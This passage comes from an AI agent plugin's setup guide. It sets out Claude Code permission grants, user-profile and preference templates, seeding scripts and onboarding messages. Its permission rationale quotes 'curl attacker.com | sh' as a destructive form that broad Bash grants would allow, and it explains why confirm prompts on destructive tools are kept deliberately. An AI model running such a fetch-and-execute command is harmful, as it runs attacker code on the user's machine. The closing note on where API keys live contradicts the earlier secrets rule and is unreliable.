      "Skill(agent-kevin:find-session)",
      "Skill(agent-kevin:humanizer)",
      "Skill(agent-kevin:mermaid)",
      "Skill(agent-kevin:plan-spec)",
      "Skill(agent-kevin:release)",
      "Skill(agent-kevin:roadmap)",
      "Skill(agent-kevin:setup-worktree)",
      "Skill(agent-kevin:simple-simplify)",
      "Skill(agent-kevin:standup)",
      "Skill(agent-kevin:sync)",
      "Skill(agent-kevin:upgrade)",
      "Skill(agent-kevin:where-am-i)"
    ]
  }
}
```

**Why no `extraKnownMarketplaces` entry?** The marketplace registration was already saved to the user's global `~/.claude/settings.json` when they first ran `/plugin marketplace add` (Option A) or were prompted to trust the marketplace (Option B). Duplicating it in project settings is redundant — only `enabledPlugins` is needed here to opt this specific home into agent-kevin.

**Why only the always-on core is granted here.** Plugin-bundled MCP tools register into the session regardless of permissions — `permissions.allow` only controls whether tool calls trigger a confirm prompt. The "always-on core" (`ping`, `capture`, `compile_*`, `knowledge_lint`, `task_*`, `links_rewrite`, `memory_prune`, `report_write`, `dashboard`, `setup_worktree`, `video_frames`, `run_upgrade`) needs no external config; the pack-gated tools need API keys or OAuth that only get set when the user opts into the matching pack. Granting them at init time would mean `settings.json` advertises packs the user never configured. Conditional grants keep `settings.json` an accurate audit trail.

**`remove_worktree` is deliberately not granted.** It deletes a worktree (a destructive filesystem action), so it's left off the allow list on purpose — every call surfaces a confirm prompt the operator has to approve. Don't "fix" the asymmetry with `setup_worktree` by adding it here; the prompt is the safeguard.

**Bucket model** (which flow writes which permissions):

| Bucket | Tools | Granted when |
|---|---|---|
| Always-on core | `ping`, `capture`, `compile_*`, `memory_prune`, `task_*`, `links_rewrite`, `report_write`, `dashboard`, `setup_worktree`, `video_frames`, `run_upgrade` | `/init` (above) |
| SEO-gated | `serpapi_search`, `open_page_rank`, `gsc_*`, `page_speed_*`, `google_auth` | configure-skills A.2a (SEO walk) |
| Browser-gated | `web_search`, `browser_*` | configure-skills A.2b (Browser walk) |
| Database-gated | `database_list`, `database_query`, `database_schema`, `database_fork` | configure-skills A.2c (Database walk) |
| GitHub-gated | `github_pr_*`, `github_run_*`, `github_issue_*`, `github_fast_forward` | configure-skills A.2d (GitHub walk) |

The allow list also carries thirteen **skill** grants. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill directly or one skill invokes another via the Skill tool). `Skill(agent-kevin:dashboard)`, `Skill(agent-kevin:where-am-i)`, `Skill(agent-kevin:find-session)`, `Skill(agent-kevin:standup)`, `Skill(agent-kevin:humanizer)`, `Skill(agent-kevin:mermaid)`, `Skill(agent-kevin:roadmap)`, `Skill(agent-kevin:setup-worktree)`, `Skill(agent-kevin:sync)`, and `Skill(agent-kevin:upgrade)` are **active**: all are model-invocable (no `disable-model-invocation`). `dashboard` refreshes-and-opens the Agent OS dashboard on a plain "refresh the dashboard"; `where-am-i` answers "where am I" directly and is also invoked by `dashboard` and `sync` to freshen the session radar (one source of truth for the radar); `find-session` is its content-search sibling, firing when the operator names *what* a session worked on rather than when it ran; `standup` builds the did/next/blocked update on "what have I done"; `humanizer` fires when Kevin is asked to strip AI-writing tells from a draft; `mermaid` fires when Kevin authors or edits a Mermaid diagram, validating it before review; `roadmap` fires when the user asks for a roadmap or plan-on-a-page, interviewing for the frame before rendering; `setup-worktree` fires on "make me a worktree for X"; `sync` runs the full state refresh (compile → lint → flywheel → briefing → dashboards) and is chained by `upgrade` after a HOME migration; `upgrade` applies pending HOME migrations after a `/plugin update`, so a plain "upgrade kevin" is enough — the operator doesn't have to know the slash command. `Skill(agent-kevin:plan-spec)`, `Skill(agent-kevin:simple-simplify)`, and `Skill(agent-kevin:release)` are **latent**: all set `disable-model-invocation` (slash-only — `/plan-spec`, `/simple-simplify`, `/release`), so the grant does nothing until that flag is dropped; they're kept here so the slash invocation never prompts. `release` (producer-only) cuts a versioned release + CHANGELOG entry.

**`rename-agent` is deliberately absent from this list.** It is `disable-model-invocation` like the latent three, but unlike them it gets no grant, so even `/rename-agent` raises a confirm prompt. It rewrites files across the entire brain in one pass; the prompt is the last thing standing between a mistyped invocation and a swept home. Adding the grant would look like tidying an oversight and would remove that gate.

**Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).

Do **not** add a `hooks` block here. Hooks come from the plugin's own `hooks/hooks.json` once the plugin is registered. Sandbox lands only via the user-global gap-fill above (never authored fresh in the scaffold when global already enables it). API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agent-kevin:configure-skills` — those files stay separate.

USER.md template:

```markdown
# About {{NAME}}

{{AVATAR_LINE}}

{{AGENT_NAME}} reads this every session (via `@-import` in `CLAUDE.md`). The headline of who I am and how I want {{AGENT_NAME}} to work with me.

## Identity

- **Name:** {{NAME}}
- **Home timezone:** {{TIMEZONE}}
- **Current timezone:** read it from the session context's `## Today` line; it follows the machine clock, so it tracks travel. When that line flags traveling, use the current zone for "now" and scheduling, and keep home-anchored deadlines in the home zone.

## How to Talk to Me

{{COMMUNICATION_STYLE_PARAGRAPH}}

_(Examples to pick from or replace: "Direct and technical, no preamble." / "Plain English, walk me through it." / "Bullet-point summaries first, details on request." / "I push back — expect me to challenge your first answer.")_

## Hard Rules

{{VALUES_OR_PLACEHOLDER}}

_(Anything {{AGENT_NAME}} should respect about your personal values, ethics, taboos, or hard preferences. Optional — leave empty if not applicable.)_

## Where Things Live

- **Primary codebase:** `{{AGENT_CODE_PATH}}` (also exposed as `$AGENT_CODE_PATH` for shell/MCP use)

## Deeper

These files hold my evolving long-form knowledge. {{AGENT_NAME}} reads them on demand and updates them on compile.

- [Profile](knowledge/user/profile.md)
- [Skills](knowledge/user/skills.md)
- [Preferences](knowledge/user/preferences.md)
- [Career](knowledge/user/career.md)
- [Interests](knowledge/user/interests.md)
```

If Step 4b returned `skip`, omit the `## Where Things Live` section entirely — Kevin's a personal agent and many operators have no primary codebase, so an empty placeholder is just noise. The operator can add it later by setting `env.AGENT_CODE_PATH` and re-running compile.

`{{AVATAR_LINE}}` rendering:
- If Step 5b staged a user avatar at `<KNOWLEDGE_ROOT>/user/assets/avatar.<ext>` → render `![Avatar](knowledge/user/assets/avatar.<ext>)` (path relative to `<HOME_DIR>`, since CLAUDE.md `@-imports` USER.md from there).
- If Step 5b was skipped → omit the line entirely (no empty placeholder).

**Write the five `knowledge/user/<facet>.md` files — preservation-aware.** For each of `profile.md`, `skills.md`, `preferences.md`, `career.md`, `interests.md`:

1. **File missing OR currently the empty-with-frontmatter stub** (frontmatter block only, no body content beyond whitespace): write the staged content.
   - If Step 5 ran with URLs and synthesised content for this facet → write the synthesised version.
   - For `preferences.md` specifically, even without Step 5 URLs, write the **shipped defaults** below (not an empty stub).
   - Otherwise → write the empty-with-frontmatter stub.
2. **File exists with body content AND Step 5 did NOT synthesise content for this facet**: skip the write entirely. Operator-curated content is preserved — this includes any edits the operator made to the shipped `preferences.md` defaults.
3. **File exists with body content AND Step 5 DID synthesise content for this facet**: `AskUserQuestion`:

   > `knowledge/user/<facet>.md` already has content. The URLs you pasted in Step 5 synthesised a fresh version. How should Kevin handle this?
   >
   > - Keep existing (recommended) — discard the synthesised version, your file stays as-is
   > - Overwrite — replace with the synthesised version (existing content lost)
   > - Merge — append synthesised facts under a `## Synthesised from URLs (<DATE>)` heading at the bottom, leaving existing content untouched

   Default: Keep existing. Apply the operator's choice per-facet.

"Empty-with-frontmatter stub" = the file's body (post-frontmatter) is empty or whitespace-only. Treat any non-whitespace body content — bullets, paragraphs, headings — as operator content worth preserving.

**`profile.md` always carries `## Signal Topics`.** The staged `profile.md` content — whether synthesised from Step 5 URLs or the empty stub — must end with a `## Signal Topics` section built from Step 6b, with the descriptive lead `morning-briefing` looks for:

```markdown
## Signal Topics

News/research topics to track for briefings and signals. Used by morning-briefing and any task that needs topical web search.

- <topic from Step 6b>
- <topic from Step 6b>
- …
```

This section is what powers the news clusters in every morning brief, so it must exist from day one even when Step 5 was skipped. **Bounded preservation exception:** if `profile.md` already has body content (case 2/3 above) but has **no** `## Signal Topics` heading, append this section to the end — additive only, never replacing existing content. If it already has one, leave it untouched (the operator or a prior compile owns it).

**Why `preferences.md` ships with defaults**: OSS users may not have a `~/.claude/CLAUDE.md` of their own with universal communication / workflow / engineering opinions. The CLAUDE.md template already `@-imports` this file every session, so the defaults flow into context automatically. Users can edit them, delete sections that don't fit, or **promote anything they love to their own `~/.claude/CLAUDE.md`** so it applies across every Claude Code project on their machine. On re-run, edits are preserved by the body-content guard above.

Shipped `preferences.md` defaults:

````markdown
---
title: Preferences
created: <YYYY-MM-DD>
updated: <YYYY-MM-DD>
---

# Preferences

> **Shipped defaults.** These are sensible, generic defaults so Kevin has opinions out of the box even before you fill in personal preferences. Edit freely. If a section fits how you'd want every Claude Code project to behave, promote it to your own `~/.claude/CLAUDE.md` and delete it here.

## Communication

- Concise by default — skip preamble, get to the answer.
- Direct over diplomatic. Honest over flattering. Push back when something is wrong instead of agreeing reflexively.
- When ambiguous, ask one clarifying question rather than guessing broadly.
- "I don't know" is a valid answer — better than a confident-sounding guess.
- Don't over-apologize. Own a mistake in one sentence and move on.

## Workflow

- **Plan before non-trivial tasks** (3+ steps or architecture decisions). Surface tradeoffs and assumptions before building.
- **Verify before claim.** Anything specific — numbers, statuses, page state, library behavior — gets a source check or "I don't know".
- **Never mark a task complete** without proving it works (tests pass, feature verified, change reviewed).
- **For UI / frontend changes**, exercise the feature in a browser before reporting done. Type checks verify code correctness, not feature correctness.
- If something goes sideways mid-task, stop and re-plan instead of pushing through.
- **When a built-in tool reports a missing dependency, relay its install hint and stop.** Don't improvise a fragile fallback. Example: the Read tool renders PDFs via poppler's `pdftoppm`; if it's absent, tell the operator to run `brew install poppler` instead of reaching for `pdftotext`, a Python lib, or manual transcription.

## Engineering Defaults

_(Delete this section if you don't write code.)_

- **Simplicity first.** Minimum code that solves the problem. No speculative abstractions, no error handling for impossible scenarios, no features beyond what was asked.
- **Surgical changes.** Touch only what the task requires. Don't refactor adjacent code or "improve" unrelated formatting.
- **Comments only when WHY is non-obvious.** Well-named code already explains WHAT. Skip docstring novellas.
- **Trust framework / SDK signals** over scraping text output. When a library exposes structured errors or status, use them.
- **Match existing project conventions** over personal preference.

## Hard No

_(Add anything Kevin should never do — sensitive content, off-limits topics, vendor lock-ins, etc. Leave empty if no hard rules apply.)_

- _(empty)_
````

If Step 5 URL synthesis surfaced anything that contradicts these defaults (e.g., the user's blog reveals they prefer step-by-step walkthroughs over terse answers), append a `## Synthesized from URLs` section below the defaults rather than overwriting them — let the user resolve the conflict later.

Also write `.claude/settings.local.json` so the file exists with the correct gitignored permissions from day one. The env keys init owns are `AGENT_HOME_TIMEZONE` from Step 4 (always written — the SessionStart hook compares it against the live machine timezone and flags the operator as traveling when they differ) and the **optional** primary-codebase pair from Step 4b, written only when a path was actually captured.

**Secrets live in `.kevin/secrets/.env`, not here.** Credential pack keys (`PERPLEXITY_API_KEY`, `SERPAPI_KEY`, `OPENPAGERANK_API_KEY`, every `AGENT_DB_*`) go in the deny-gated `.kevin/secrets/.env` — `/agent-kevin:configure-skills` ensures that file exists and tells the user which `KEY=value` lines to add (the file is deny-gated, so Claude can't write its contents; the user edits it). Kevin's config loader surfaces it into `process.env` at boot; the settings `env` block is no longer a secrets store. `GSC_SITE_URL` is the one pack key that **stays** in `settings.local.json` `env` — it's not a credential and two skills (`wordpress-rest`, `google-search-audit`) read it straight from the Bash environment, which only the settings `env` block reaches. Google OAuth client JSON + tokens live in `.kevin/secrets/google/`. This keeps `settings.local.json` non-secret and an accurate audit trail of what the operator opted into.

Env spelling: HOME-scoped keys are written under their shared, agent-neutral `AGENT_*` names — the file's location already scopes them to this agent, and the HOME stays portable. The agent's own prefix (`KEVIN_*`) is a valid override everywhere and always wins; it's required only in machine-wide `~/.claude/settings.json`, where the prefix is what keeps one agent's value from reaching every agent on the box (which is why `KEVIN_HOME` keeps it).

The rule: **init owns env keys that are universal to every operator; configure-skills owns pack-gated env keys.** Kevin's universal-infra keys are `AGENT_HOME_TIMEZONE` and the optional codebase pair, so:

- **Step 4b captured a real path:** write `AGENT_CODE_PATH` and derive `AGENT_GIT_REPOS` by enumerating the main-checkout git repos beside it — one level under the code root, `.git` **directory** only so sibling worktrees (whose `.git` is a pointer file) don't flood the list (it surfaces those repos' recent git activity in the SessionStart `## Recent Git Activity` block, and where-am-i's session radar scopes by the code root too — operators can append more later, `,/path/to/other/repo`, without touching plugin code).

  ```bash
  GIT_REPOS=""
  if [ -n "$AGENT_CODE_PATH" ]; then
    CODE_ROOT=$(dirname "$AGENT_CODE_PATH")
    for repo in "$CODE_ROOT"/*/; do
      [ -d "$repo/.git" ] && GIT_REPOS="${GIT_REPOS:+$GIT_REPOS,}${repo%/}"
    done
    GIT_REPOS="${GIT_REPOS:-$AGENT_CODE_PATH}"
  fi
  ```

  Show the derived list to the operator before writing — one line, e.g. *"Git activity will cover: `<GIT_REPOS>` — trim any you don't want in your session context."* — and honour any trim they reply with.

  ```json
  {
    "env": {
      "AGENT_HOME_TIMEZONE": "<TIMEZONE>",
      "AGENT_CODE_PATH": "<AGENT_CODE_PATH>",
      "AGENT_GIT_REPOS": "<GIT_REPOS>"
    }
  }
  ```

- **Step 4b returned `skip`:** write only `AGENT_HOME_TIMEZONE` — no orphan empty keys. A code path is genuinely optional for a personal agent; the operator can add it later by editing this file.

- **If the file already exists:** never overwrite existing values. Merge in `AGENT_HOME_TIMEZONE` if absent, and the codebase pair only if (a) Step 4b captured a real path AND (b) `env.AGENT_CODE_PATH` / `env.AGENT_GIT_REPOS` are currently absent or the empty string. Leave all other keys untouched. configure-skills walks merge in pack-gated keys via §D when activated.

We intentionally do **not** prompt for any secret values in chat (see the rule below); the codebase path is not a secret — it's captured in Step 4b's plain-chat prompt.

**Never solicit values via chat** — secrets must not enter the session transcript or the Anthropic API. The session-capture hook redacts known prefixes (`pplx-…`, `sk-…`, `AIza…`, etc.) as defense-in-depth, but the safer move is to keep values off the wire entirely.

The Step 8 pack walks handle non-secret config (permission grants, Google OAuth file drop, host-scoped curl grants), plant the non-secret `GSC_SITE_URL` placeholder, and ensure `.kevin/secrets/.env` exists — but defer all secret lines and *value* entry to the editor. Step 9's "Next" block instructs the user explicitly.

**Write `knowledge/index.md` — preservation-aware.** Operators add catalog bullets over time (linking to concepts they've authored manually).

- File missing → write the scaffold below.
- File exists with any non-whitespace body content → skip the write entirely.

Scaffold:

```markdown
---
title: Knowledge — Master Index
created: <YYYY-MM-DD>
updated: <YYYY-MM-DD>
---

# Knowledge

Master catalog of Kevin's compiled knowledge. Kevin keeps this current via `/agent-kevin:knowledge-compile`.

## User (<NAME>)

Long-form, evolving knowledge about the operator. Five facets, each updated as compile reveals durable facts.

- [[user/profile]] — bio, identity, family, faith, location, languages, calling hours
- [[user/skills]] — technical stack and domain expertise
- [[user/preferences]] — communication style, workflow rules, coding style, ethical guardrails
- [[user/career]] — work history, employers, roles, equity grants, education, certifications
- [[user/interests]] — vision projects, startup ideas, signal topics

## Concepts (cross-cutting patterns)

Cross-cutting patterns spanning ≥2 projects. Synthesized insights, not project summaries. The four seeded below describe the system itself; new concepts land here as `concepts/<slug>.md` after `/agent-kevin:knowledge-compile` runs.

- [[concepts/karpathy-wiki]] — LLM-maintained knowledge base architecture (the pattern behind this whole system)
- [[concepts/markdown-native-task-management]] — File-per-task with YAML frontmatter, Obsidian UI, programmatic enforcement
- [[concepts/self-evolution-loop]] — Feedback-driven prompt improvement: capture → compile → learnings → optional approved diffs
- [[concepts/audit-premise-decay]] — Inherited audits, thresholds, and metrics drift; verify the premise (not just the recommendations) before executing

## Memory

- [[memory/index]] — hot context loaded every session: daily-memory manifest, active threads, recent decisions, pending items, key context, learnings

## Reports (transient skill outputs — 3rd-degree context)

- [reports/index](../reports/index.md) — dated audit trail of all skill outputs (briefings, plans, etc.). Read-only network of links; not absorbed into memory or concepts. Promote anything durable into `raw/inbox/` (via `kevin capture --file=...` or a direct drop) and compile. File is auto-created by `report_write` on the first reporting-skill call.

## Projects

Operational work units. Each has its own README, tasks/, and tracker. Project READMEs live outside the wiki and use markdown links (not wikilinks).

Cross-project task dashboard: [projects/TASKS.md](../projects/TASKS.md).

## Raw (inputs to compile)

- `raw/sessions/YYYY-MM-DD.md` — auto-captured session transcripts (single file per day, no suffixes)
- `raw/user/feedback.md` — append-only correction + reaction log; compiled into [[memory/index]] `## Learnings`
- `raw/inbox/` — drop any input here (or use `kevin capture`) for compile to distill into concepts
- `raw/archive/inbox/` — compiled inbox items land here post-archive
```

Substitute `<NAME>` with the operator's name from Step 4a and `<YYYY-MM-DD>` with today's date. The Reports link points at a path that doesn't exist until `report_write` runs once — Obsidian renders the unresolved link gracefully, and the file materialises on first use.

**Write `knowledge/memory/index.md` — strict preservation.** This is the highest-stakes file in the tree — months of `/agent-kevin:knowledge-compile` output (Active Threads, Recent Decisions, Learnings) live here.

- File missing OR file body is empty/whitespace-only → write the master-index scaffold with empty placeholder sections.
- File exists with any non-whitespace body content → **never overwrite**. Skip the write entirely, no prompt. The Step 0 prompt already committed to preserving this; honour it unconditionally.

For `projects/TASKS.md`, write this scaffold — the task-list sections render automatically when the `dashboard` tool first runs (which the auto-rebuild on the user's first task creation will trigger):

```markdown
> Tasks hub — auto-generated by Kevin from task frontmatter on every mutation. Do not edit this file directly: tasks change via the task tools, goals via the weekly-goals / monthly-goals / yearly-goals skills.

<!-- GOALS:START -->
## Weekly Goals

_No weekly goals set yet — run the weekly-goals skill to set them._

## Monthly Goals

_No monthly goals set yet — run the monthly-goals skill (Kevin proposes on the 1st of each Hijri month)._

## Yearly Goals

_No yearly goals set yet — run the yearly-goals skill to plan the year by quarters._
<!-- GOALS:END -->
```

After scaffolding, call `mcp__plugin_agent-kevin_kevin__dashboard` once so the file has its (empty) Active/Blocked/Overdue/Stale/Recently Closed sections rendered from day one — no scaffold drift (this also writes the first `dashboard.html`).

**Seed concept articles — preservation-aware.** Four bundled concepts describe the system itself (the wiki pattern, the task system, the feedback loop, the audit-premise-decay heuristic). Seeding them means a freshly-initialised home has working `[[concepts/*]]` wikilinks from day one instead of broken refs, and the operator can read them to understand the architecture they just installed.

```bash
TODAY="$(date +%Y-%m-%d)"
for src in "${CLAUDE_PLUGIN_ROOT}"/templates/knowledge/concepts/*.md; do
  [ -f "$src" ] || continue
  dest="$KNOWLEDGE_ROOT/concepts/$(basename "$src")"
  if [ -f "$dest" ]; then
    continue   # operator already has it — never overwrite
  fi
  sed "s/{{INIT_DATE}}/${TODAY}/g" "$src" > "$dest"
done
```

Idempotent by file: any existing concept file is preserved (the `[ -f ]` check passes for empty files too — operators who want a seed permanently gone can `: > path/to/concept.md` to leave a 0-byte placeholder, rather than `rm`-ing it and getting it re-seeded on re-init).

**Seed coding rules — preservation-aware.** The plugin bundles path-scoped coding rules under `templates/rules/*.md` (`typescript.md`, `swift.md`). Claude Code auto-loads any `.claude/rules/*.md` whose `paths:` frontmatter matches the file being edited, so seeding them gives the home sane language defaults from day one. The operator can edit or delete any of them.

```bash
mkdir -p "$HOME_DIR/.claude/rules"
for src in "${CLAUDE_PLUGIN_ROOT}"/templates/rules/*.md; do
  [ -f "$src" ] || continue
  dest="$HOME_DIR/.claude/rules/$(basename "$src")"
  [ -f "$dest" ] && continue   # operator already has it — never overwrite
  cp "$src" "$dest"
done
```

Idempotent by file, same as the concept seeding above: an existing rule file is never overwritten.

---

## Step 8 — Optional: configure skill packs

The scaffold is done. Before showing the final confirmation, offer to wire up API keys + MCP servers + permissions for the optional packs. This is exactly what `/agent-kevin:configure-skills` does — invoking inline so the user doesn't have to run it as a separate command after relaunch.

`AskUserQuestion` (**multi-select**, so the user can tick any combination):

> **Activate skill packs now?**
> Each pack already ships loaded with the plugin. Activating a pack grants its MCP tool permissions in `settings.json` (so calls don't re-prompt), plants the non-secret `GSC_SITE_URL` placeholder in `settings.local.json`, and ensures `.kevin/secrets/.env` exists for the secret keys you'll add via your editor. Skip entirely if you want to come back later via `/agent-kevin:configure-skills`.
>
> - ☐ SEO pack (serpapi · open-page-rank · GSC · page-speed · WP · search-audit)
> - ☑ Browser pack **(recommended)** (perplexity search + browser screenshot/pdf/record + browser-flows)
> - ☐ Database pack (connect Kevin to one or more Postgres databases — read-only `database_list`/`database_schema`/`database_query` + `database_fork` to clone a local DB for risky schema work)
> - ☐ GitHub pack **(recommended when you gave a code path)** (read-only PR, issue + GitHub Actions access — `github_pr_*` / `github_issue_*` / `github_run_*` — to review PRs/issues and diagnose failing CI builds, plus `github_fast_forward`, which is what keeps your checkouts current on every `/agent-kevin:sync`; needs `GITHUB_TOKEN` **and** the `gh` CLI)
> - ☐ Third-party libraries (aaron-he-zhu SEO/GEO skills, coreyhaines31 marketing playbooks, others)

Default-select **Browser** (recommended — Playwright's capture tools work immediately with no key, and Perplexity just waits on a key). Leave the others unticked; the user ticks any they want.

**Also default-tick GitHub when Step 4b captured a real code path.** `github_fast_forward` is what keeps those checkouts current during `/agent-kevin:sync`, and it needs `GITHUB_TOKEN`; without the pack it returns `NOT_CONFIGURED` and the operator's code silently never refreshes — the one failure mode that degrades *answers* rather than surfacing an error, since Kevin keeps grounding confidently against a frozen checkout. An operator who just told init where their code lives has effectively asked for this. Leave it unticked when Step 4b returned `skip` (no checkout, nothing to fast-forward — the common case for a Kevin home). Either way it stays a tick the operator can clear.

Behavior on the response:
- **Each ticked option**: run the matching configure-skills section in order — SEO (A.2a) → Browser (A.2b) → Database (A.2c) → GitHub (A.2d) → Third-party (F). The walks **never prompt for API key values or connection strings in chat** — they add MCP grants to `settings.json`, plant the `GSC_SITE_URL` placeholder, and ensure `.kevin/secrets/.env` exists. The user adds the secret lines + values via their editor after relaunch.
- **Nothing ticked**: skip — note "skill packs not activated — run `/agent-kevin:configure-skills` after relaunch" for Step 9's status block. Don't touch settings files.

For each picked option: **delegate to configure-skills** — open `${CLAUDE_PLUGIN_ROOT}/skills/configure-skills/SKILL.md` and follow the matching section. Honor every per-skill skip option inside that flow; don't force the user through items they don't want.

---

## Step 9 — Confirmation

Print the same banner as Step 1 for visual continuity, with `===KEVIN=== 🍌` standing alone on its line (no trailing word). The "Ready" line follows below, separated by a blank line.

````
```
 ╔═╗ ╔═╗ ╔═╗ ╔╗╔ ╔╦╗
 ╠═╣ ║ ╦ ║╣  ║║║  ║ 
 ╩ ╩ ╚═╝ ╚═╝ ╝╚╝  ╩ 
===KEVIN=== 🍌
```
````

Then a blank line, then the **Ready** heading:

> 🟢 **Ready**

Blank line, then the status block as plain prose (one row per line, two-space gutter between label and value):

> ✅ Home          `<HOME_DIR>`
> ✅ Identity      SOUL.md · IDENTITY.md · USER.md
> ✅ Operating manual   `<MANUAL_PATH>` (`@-imports` the above)
> ✅ Plugin reg    .claude/settings.json (auto-loads agent-kevin next launch — no `--plugin-dir` needed)
> ✅ Knowledge     `<FACET_FILES_FILLED>/5` facets populated `<from blog · LinkedIn · GitHub, if Step 5 ran>`
> ✅ Indexes       knowledge/index.md · knowledge/memory/index.md · projects/TASKS.md
> ✅ Dashboard     dashboard.html — open it in any browser; rebuilt by every sync or `/agent-kevin:dashboard`
> ✅ Concepts      4 seeded: karpathy-wiki · markdown-native-task-management · self-evolution-loop · audit-premise-decay
> `<SKILL_PACK_ROW>`
> ⏳ Custom skills none — author with `/agent-kevin:configure-skills`

For `<SKILL_PACK_ROW>`, render the row based on what Step 8 did. Note: "activated" here means permissions granted + `.kevin/secrets/.env` ensured (and the `GSC_SITE_URL` placeholder planted), not key values — those come from the user editing `.kevin/secrets/.env` (secrets) and `settings.local.json` (`GSC_SITE_URL`).
- If user skipped Step 8 entirely → `⏳ Skill packs   none activated — run /agent-kevin:configure-skills later`
- If user activated any pack → `✅ Skill packs   <list, e.g. "SEO (perms granted; fill SERPAPI_KEY + OPENPAGERANK_API_KEY in .kevin/secrets/.env, GSC_SITE_URL in settings.local.json), Browser (perms granted; fill PERPLEXITY_API_KEY in .kevin/secrets/.env), Database (perms granted; fill AGENT_DB_<NAME> in .kevin/secrets/.env), GitHub (perms granted; fill GITHUB_TOKEN in .kevin/secrets/.env)">`

Use ✅ for what landed and ⏳ for deferred (the hourglass implies "queued for later"). Don't list `<FACET_FILES_FILLED>/5` if Step 5 was skipped — just say "stubs only" instead.

For the operating-manual row:
- No collision: `<MANUAL_PATH>` = `CLAUDE.md`
- Collision detected (pre-existing CLAUDE.md): `<MANUAL_PATH>` = `CLAUDE.local.md` — also append a callout line:
  > ℹ️ Existing `CLAUDE.md` detected at home — Kevin's operating manual was written to `CLAUDE.local.md` alongside it. Both files load; your prior CLAUDE.md is untouched.

Blank line, then the **Next** heading (same style as Ready), then the relaunch prose. **Important: the user must exit and relaunch** so the new `.claude/settings.json` is picked up by Claude Code:

> 🚀 **Next**
>
> **Fill any secret/env values.** Two files, by sensitivity:
> - **Secrets → `<HOME_DIR>/.kevin/secrets/.env`** (0600, deny-gated, gitignored; Kevin loads it into the environment at boot). If you ticked SEO / Browser / Database at Step 8, the walk created this file — add the lines you need (it's deny-gated, so you fill it yourself):
>   - `PERPLEXITY_API_KEY` — Browser pack (sign up at https://perplexity.ai/settings/api)
>   - `SERPAPI_KEY` — SEO pack (https://serpapi.com)
>   - `OPENPAGERANK_API_KEY` — SEO pack (https://openpagerank.com)
>   - `AGENT_DB_<NAME>` — Database pack: one Postgres connection string per line
>   - `GITHUB_TOKEN` — GitHub pack: a fine-grained, read-only PAT (PRs·Issues·Metadata·Actions·Contents — NOT Workflows; there is no Checks permission for PATs). Needs the `gh` CLI on PATH (`brew install gh`).
> - **Private config → `<HOME_DIR>/.claude/settings.local.json`** `env`: init wrote `AGENT_HOME_TIMEZONE` (your home base — sessions flag traveling when the machine timezone differs), plus `AGENT_CODE_PATH` / `AGENT_GIT_REPOS` if you gave a codebase path at Step 4b. Set `GSC_SITE_URL` here (your Search Console property — not a secret, and Bash-based SEO skills read it from here) before running `mcp__plugin_agent-kevin_kevin__google_auth`. For Google, drop the OAuth client JSON at `<HOME_DIR>/.kevin/secrets/google/google-oauth-client.json`.
>
> Didn't tick a pack at Step 8? Run `/agent-kevin:configure-skills` later — it adds permissions, ensures `.kevin/secrets/.env` exists, and tells you the lines to add via your editor. Tools whose key is missing stay loaded but return "missing env var" if called — add the line any time later and the next session picks it up.
>
> **Always launch <AGENT_NAME> from its home — `<HOME_DIR>`.** The habit is `cd <HOME_DIR> && claude` every time. The home is then resolved from where you launched, and a session that `cd`s off into a repo mid-flight still resolves correctly, because the launch directory doesn't roam even when your shell does.
>
> **Optional pin — only if you run exactly one home.** If you also want sessions started *outside* any home (a bare repo, the user-level session-capture hook from the README) to route here, add this to your **user-level** settings at `~/.claude/settings.json` under `env`:
>
> ```json
> { "env": { "KEVIN_HOME": "<HOME_DIR>" } }
> ```
>
> **Do not set this if you have, or might later have, more than one agent-kevin home** (say a work agent and a personal one). It's machine-wide and it wins outright over launch-directory resolution, so it captures *every* session for one home and makes the others unreachable. With multiple homes, isolation comes from where you launch, and the pin actively breaks it. Same rule for any other `KEVIN_*` var in user-level settings: one value, every home. Per-home config belongs in `<HOME>/.claude/settings.local.json` under the neutral `AGENT_*` names. (Whatever you choose is visible on the dashboard's System → Environment page, with a tooltip explaining it.)
>
> **One-time MCP-server install.** Kevin's MCP server runs from the plugin directory and needs its node_modules. From a separate terminal (or after `/exit`), run:
>
> ```bash
> cd <PLUGIN_PATH>/mcp-server && bun install
> ```
>
> (where `<PLUGIN_PATH>` is the absolute path of the plugin — same as `${CLAUDE_PLUGIN_ROOT}` during this init.) This pulls Chromium for Playwright (~150MB) and is required even if you installed via `/plugin marketplace add`. Skip if you've already done it for another Kevin home.
>
> **Then relaunch.** The plugin registration in `.claude/settings.json` only takes effect on a fresh session. Exit now (`/exit` or Ctrl+D) and relaunch:
>
> ```bash
> cd <HOME_DIR>
> claude
> ```
>
> **Watch for a marketplace trust prompt.** On first relaunch, Claude Code asks "this project wants to register a marketplace and enable a plugin — trust it?" **Accept it.** If you dismiss/miss the prompt, the plugin won't load and the SessionStart banner won't appear — recover by running:
>
> ```
> /plugin marketplace add <PLUGIN_DIR>
> /plugin install agent-kevin@agentlayer
> ```
>
> (where `<PLUGIN_DIR>` is the absolute path of the cloned plugin — same path as `${CLAUDE_PLUGIN_ROOT}` during this init session.)
>
> Once the plugin is loaded, try:
>
> - `/agent-kevin:dashboard` — open the Agent OS dashboard (your whole setup on one page)
> - `/agent-kevin:configure-skills` — configure skill packs (SEO, Browser) or author a custom skill
> - `/agent-kevin:create-project` — start your first project
> - `/agent-kevin:morning-briefing` — see what Kevin knows about you
> - `mcp__plugin_agent-kevin_kevin__ping` — health check the MCP server
>
> Open `<HOME_DIR>` in Obsidian to view/edit your wiki.

---

## Notes for you (the orchestrating Claude)

- **Idempotent.** Step 0 catches re-runs and surfaces the explicit write list. Step 7's facet + index writes preserve operator-curated content (`knowledge/user/*.md`, `knowledge/index.md`) and never replace existing compile output (`knowledge/memory/index.md`). Re-running on an active HOME is safe.
- **No secrets in identity files.** API keys go to `<HOME>/.claude/settings.local.json` via the configure-skills flow (Step 8 inline or `/agent-kevin:configure-skills` later), never to CLAUDE/SOUL/IDENTITY/USER.
